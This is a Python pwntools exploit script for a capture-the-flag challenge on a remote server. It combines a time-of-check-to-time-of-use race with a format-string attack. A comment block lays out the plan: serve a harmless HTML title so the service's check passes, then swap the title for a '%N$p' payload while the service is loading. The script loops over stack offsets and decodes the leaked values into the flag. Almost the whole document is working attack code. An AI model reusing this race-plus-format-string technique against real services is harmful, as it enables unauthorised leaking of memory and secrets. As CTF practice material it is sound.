#!/usr/bin/env python3

from pwn import *


'''
The remote process is roughly:
fetch title
check title
loading animation <- TOCTOU
fetch title
print title <- FMTSTR

So the exploit consists of:
Hosting a simple HTML server with a dummy title (so run the server first)
Making the remote fetch my page to bypass the check
While in the loading animation, change the title to %p
Leak the stack and reconstruct the flag
'''


def create_page(titolo, filename="index.html"):
	    html = f"""<!doctype html>
	<html>
	<head>
	    <meta charset="utf-8">
	    <title>{titolo}</title>
	</head>
	<body>
	    <h1>{titolo}</h1>
	</body>
	</html>
	"""

	    with open(filename, "w") as f:
	        f.write(html)

	    print(f"titolo: {titolo}")


dump = []
context.log_level = 'error'

def hex_to_ascii(values):
    result = b""
    for value in values:
        if "0x" not in value:
            continue
        result += bytes.fromhex(value[2:])[::-1]

    return result



local_link = b"yourlink"
flag_start = 14
for i in range(flag_start, 27):
	print("zzz...")
	sleep(1)
	try:
		io = remote("challs.scriptsorcerers.xyz", 10089)
		create_page("safe")
		io.sendlineafter(b"enter host: ", local_link)
		io.recvuntil(b"validating")
		create_page(f"%{i}$p")
		io.recvuntil(b"completed fetching: ")
		data = io.recvline().strip().decode()
		dump.append(data)
		print(dump)
		print(hex_to_ascii(dump))
		io.close()
	except EOFError:
		io.close()

